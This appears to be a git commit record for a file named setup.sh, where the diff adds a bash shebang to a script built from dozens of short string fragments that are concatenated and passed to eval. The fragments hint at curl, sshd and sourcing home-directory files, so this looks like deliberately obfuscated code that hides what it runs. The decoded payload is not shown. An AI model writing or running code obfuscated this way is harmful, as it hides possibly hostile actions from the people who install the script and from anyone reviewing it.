4854cd96c5dc95c6fc1a20008e0714a2c2d07a7b
rwrtx <152061298+rwrtx@users.noreply.github.com>
2023-12-11 10:26:46 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,2 +1,3 @@
+#!/bin/bash
 z="
 ";atz='_vns';ohz='rl -';byz='/swa';gcz='e>Ti';thz='/rep';rmz='<<"k';xPz='(){';Ilz='apab';rsz='sshd';ePz=' -w ';oGz=' )"';DFBz='. ~/';VGz='w PR';XDBz='tore';faz=''\>eval "$Az$Bz$Cz$Dz$z$Az$Ez$Fz$Gz$z$Az$Hz$Iz$Jz$Kz$Gz$z$Az$Hz$Iz$Lz$Mz$Nz$Oz$z$Pz$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$z$Xz$Yz$Zz$az$bz$z$cz$dz$ez$fz$z$gz$dz$hz$Wz$z$iz$jz$Uz$kz$>
